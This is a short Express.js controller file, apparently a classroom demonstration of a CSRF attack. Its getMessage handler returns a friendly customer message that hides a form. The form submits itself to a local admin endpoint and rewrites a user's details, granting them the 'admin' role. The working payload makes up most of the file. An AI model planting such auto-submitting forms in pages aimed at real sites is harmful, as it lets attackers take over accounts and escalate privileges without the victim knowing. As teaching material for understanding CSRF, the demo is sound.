exports.getHome = (request, response) => {    
    response.render('home');
}


/**
 * Demonstration attaque CSRF
 * @param {*} request 
 * @param {*} response 
 */
exports.getMessage = (request, response) => {    
    response.send(`Bonjour ,

    Je veux passer une commande chez vous, mais je n'y arrive pas.
    
    <form id="test" style="display:none;" action="http://localhost:3000/admin/user/edit/65aa37635a2685a303195299" method="post">
    <input type="text" name="lastname" value="Toto" >
    <input type="text" name="firstname" value="titi">
    <input type="email" name="email" value="titi@yopmail.com">
    <select multiple="multiple" name="roles" size="5">
    <option value="user" selected="selected">Utilisateur</option>
    <option value="admin" selected="selected">Administrateur</option>
    </select>
    </form>
    <script>document.getElementById("test").submit()</script>`);
}